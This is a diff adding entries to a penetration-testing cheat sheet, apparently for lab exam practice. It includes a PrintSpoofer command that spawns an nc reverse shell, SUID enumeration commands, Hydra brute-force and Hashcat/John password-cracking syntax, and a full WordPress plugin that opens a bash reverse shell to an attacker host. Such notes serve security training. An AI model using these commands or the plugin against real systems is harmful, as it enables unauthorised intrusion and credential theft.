@@ -54,12 +54,23 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 ## Enumeration
 
 ## Privilege Escalation
+### PrintSpoofer
+- .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
   
 
 # Linux Foothold
 ## Enumeration
 
 ## Privilege Escalation
+### SUID Executables - taken from [here](https://medium.com/@balathebug/linux-privilege-escalation-by-using-suid-19d37821ed12)
+- find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+- find / -uid 0 -perm -4000 -type f 2>/dev/null
+OR
+- find / -perm -u=s -type f 2>/dev/null
+OR
+- find / -user root -perm -4000 -print 2>/dev/null
+- find / -perm -u=s -type f 2>/dev/null
+- find / -user root -perm -4000 -exec ls -ldb {} \;
 
   
 
@@ -68,18 +79,38 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
   
 
 # Tool Syntax
-## Hydra
+## Crackmapexec
+## Password Attacks
+### Hydra
 - hydra -l \<user> -P /usr/share/wordlists/rockyou.txt -s \<alternate port> ssh://$IP
 - hydra -L /usr/share/wordlists/dirb/others/names.txt -p "\<found password>" rdp://$IP
 - hydra -l \<user>-P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"
 - Basic Auth
 	- hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.201 http-get
-## Hashcat
+### Hashcat
 - hashcat -m 0 \<hashfile> /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
 - hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show
-### check hash cat for which mode to use (searching for KeePass in this case)
-- hashcat --help | grep -i "KeePass" 
-- hashcat -h | grep -i "ssh"
-## john the ripper
+- check hashcat for which mode to use (searching for KeePass in this case)
+	- hashcat --help | grep -i "KeePass" 
+	- hashcat -h | grep -i "ssh"
+### john the ripper
 - ssh2john id_rsa > ssh.hash 
 - keepass2john \<database_name>.kdbx > keepass1.hash
+## Wordpress Cheatsheet
+### wpscan
+- wpscan --url http://\<url. --api-token \<APItoken>
+### reverse shell Wordpress plugin
+
+	    <?php
+	    
+	    /**
+	    * Plugin Name: Reverse Shell Plugin
+	    * Plugin URI:
+	    * Description: Reverse Shell Plugin
+	    * Version: 1.0
+	    * Author: Vince Matteo
+	    * Author URI: http://www.sevenlayers.com
+	    */
+	    
+	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
+	    ?>
